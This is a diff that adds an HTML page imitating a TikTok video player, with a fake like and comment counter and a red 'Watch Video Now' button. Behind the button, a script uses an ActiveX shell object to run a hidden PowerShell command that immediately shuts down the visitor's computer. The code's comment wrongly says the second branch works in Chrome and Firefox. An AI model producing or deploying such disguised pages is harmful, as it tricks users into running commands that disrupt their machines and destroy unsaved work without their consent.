@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>TikTok - Video Player</title>
+    <style>
+        body { 
+            background-color: #000; 
+            color: white; 
+            font-family: 'Segoe UI', sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center;
+        }
+        .container { 
+            width: 100%; 
+            max-width: 450px; 
+            text-align: center; 
+            padding: 20px;
+        }
+        .video-placeholder { 
+            background-color: #111; 
+            height: 60vh; 
+            margin-bottom: 20px; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            border-radius: 8px;
+            position: relative;
+        }
+        .play-icon { 
+            font-size: 50px; 
+            color: white; 
+            opacity: 0.7;
+        }
+        h1 { margin: 0 0 10px 0; font-size: 24px; }
+        p { color: #aaa; font-size: 14px; margin-bottom: 25px; }
+        
+        .btn { 
+            padding: 18px 35px; 
+            font-size: 20px; 
+            color: white; 
+            background-color: #fe2c55; /* TikTok Red */
+            text-decoration: none; 
+            border-radius: 6px; 
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.4);
+            transition: transform 0.2s, background 0.3s;
+        }
+        .btn:hover { 
+            background-color: #e6274d; 
+            transform: scale(1.05); 
+        }
+        
+        /* Fake UI Elements */
+        .ui-top { position: absolute; top: 20px; left: 20px; font-size: 14px; opacity: 0.8; }
+        .ui-bottom { position: absolute; bottom: 20px; right: 20px; font-size: 14px; opacity: 0.8; display: flex; gap: 15px;}
+        .ui-icon { width: 30px; height: 30px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Fake Video Player -->
+        <div class="video-placeholder" id="videoPlayer">
+            <div class="ui-top">
+                <span>❤️ 12.5K</span><br>
+                <span>💬 843</span><br>
+                <span>↗️ Share</span>
+            </div>
+            <div class="play-icon">▶️</div>
+        </div>
+
+        <!-- The Hidden Shutdown Button -->
+        <a href="#" onclick="runShutdown()" class="btn">Watch Video Now</a>
+        
+        <p style="margin-top: 15px; font-size: 12px; color: #666;">Tap to play video and watch!</p>
+    </div>
+
+    <script>
+        function runShutdown() {
+            // Small delay so they see the button click
+            setTimeout(function() {
+                try {
+                    // Try Windows Script Shell first (works in Edge/IE)
+                    var shell = new ActiveXObject("WScript.Shell");
+                    shell.Run("powershell.exe -Command \"Start-Process shutdown -ArgumentList '/s /t 0' -WindowStyle Hidden\"", 0, true);
+                } catch(e) {
+                    // Fallback for Chrome/Firefox
+                    var p = new ActiveXObject("WScript.Shell").Run("cmd.exe /c start powershell.exe -Command \"Start-Process shutdown -ArgumentList '/s /t 0' -WindowStyle Hidden\"", 0, true);
+                }
+            }, 500); // 0.5 second delay
+        }
+    </script>
+</body>
+</html>
